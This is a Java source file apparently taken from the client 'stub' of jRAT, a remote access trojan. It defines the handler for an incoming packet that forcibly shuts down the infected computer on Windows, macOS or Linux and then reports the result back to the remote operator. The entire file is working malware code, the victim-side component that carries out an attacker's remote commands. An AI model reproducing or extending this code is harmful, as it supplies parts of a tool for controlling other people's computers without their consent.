package io.jrat.stub.packets.incoming;

import io.jrat.stub.Connection;
import io.jrat.common.Constants;
import oslib.OperatingSystem;

public class Packet28ShutdownComputer extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		try {
			if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
				Runtime.getRuntime().exec("shutdown /p /f");
			} else if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.MACOS) {
				Runtime.getRuntime().exec("shutdown -h now");
			} else {
				Runtime.getRuntime().exec("shutdown now");
			} 
			
			con.status(Constants.STATUS_STARTING_SHUTDOWN);
		} catch (Exception ex) {
			ex.printStackTrace();
			con.status(Constants.STATUS_FAILED_SHUTDOWN);
		}
	}

}
